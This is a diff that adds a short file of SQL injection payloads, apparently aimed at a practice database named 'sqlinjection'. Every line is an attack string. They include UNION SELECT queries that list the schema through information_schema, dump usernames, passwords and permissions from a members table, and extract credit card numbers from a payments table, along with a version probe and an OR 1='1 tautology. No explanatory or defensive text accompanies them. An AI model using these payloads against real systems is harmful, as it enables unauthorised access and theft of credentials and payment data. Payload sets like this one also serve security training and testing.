@@ -1,0 +1,11 @@
+category=2 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns
+
+Ford' OR 1='1
+
+category=2 UNION SELECT password,username,permission FROM sqlinjection.members
+
+category=2 UNION SELECT password,username,permission FROM sqlinjection.members UNION SELECT 1,id,3,4 FROM sqlinjection.members
+
+Ariel' UNION SELECT @@version, 2 #
+
+ 1500 AND categories.id = category) AS maxamount FROM categories HAVING maxamount IS NOT NULL UNION SELECT 1,creditcard_number,3,4 FROM sqlinjection.payments UNION SELECT 1,id,3,4 FROM sqlinjection.members#  
